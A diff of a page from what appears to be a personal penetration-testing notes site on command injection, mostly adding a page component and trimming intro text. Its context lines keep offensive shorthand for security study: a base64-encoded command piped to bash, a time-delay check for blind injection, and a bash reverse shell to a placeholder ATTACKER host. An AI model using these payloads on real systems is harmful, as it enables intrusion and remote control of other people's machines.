@@ -5,6 +5,14 @@ description: "Detect execution, preserve request encoding, choose shell-specific
 keywords: ["command injection", "cmdi", "shell separators", "ifs", "blind injection", "time delay", "filter bypass", "command injection spaces filtered", "shell argument separation whitespace filter"]
 ---
 
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
+
 {/* COMMAND_SHORTCUT_START */}
 
 **Current starting checks:** [Web: Enumeration Methodology](/web/methodology) · [Web shell → terminal](/commands/web-shell-to-terminal)
@@ -210,12 +218,6 @@ Keep the successful request, baseline, proof, user identity, and relevant constr
 
 Source: synthesized from your supplied [Command Injections notes](/web/htb/command-injections), with the working sequence and explanations provided here for daily use.
 
-## Earlier notebook reference
-
-The original shorthand is retained below. Use the context, prerequisites, and corrections above when applying these examples.
-
-Supplementary quick reference from the existing vault site. It does not mark the module as complete.
-
 User input reaches a shell. Chain your command with the app's using a separator.
 
 ```bash
@@ -244,7 +246,6 @@ echo aWQ= | base64 -d | bash
 # reverse shell once you have execution
 bash -c 'bash -i >& /dev/tcp/ATTACKER/9001 0>&1'
 ```
-
 
 > Blind command injection: confirm with time delay (`; sleep 5`) or an out-of-band DNS/HTTP callback before assuming it failed.
 
